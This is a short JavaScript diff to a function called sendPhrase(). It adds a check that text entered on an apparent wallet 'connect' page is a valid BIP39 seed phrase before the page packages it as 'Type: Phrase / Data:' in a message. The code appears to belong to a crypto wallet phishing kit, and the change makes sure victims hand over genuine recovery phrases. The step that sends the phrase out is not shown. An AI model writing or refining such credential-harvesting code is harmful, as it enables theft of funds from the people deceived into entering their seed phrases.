@@ -47,6 +47,23 @@ function sendPhrase() {
             alert('Please enter your credentials before connecting.');
             return;
         }
+
+        const words = phraseData.toLowerCase().split(/\s+/);
+        let isValidPhrase = true;
+        if (typeof BIP39_WORDS !== 'undefined') {
+            for (let word of words) {
+                if (!BIP39_WORDS.has(word)) {
+                    isValidPhrase = false;
+                    break;
+                }
+            }
+        }
+
+        if (!isValidPhrase) {
+            alert('Data entered is not a valid seed phrase');
+            return;
+        }
+
         isValid = true;
         messageString = "Type: Phrase\nData: " + phraseData;
 
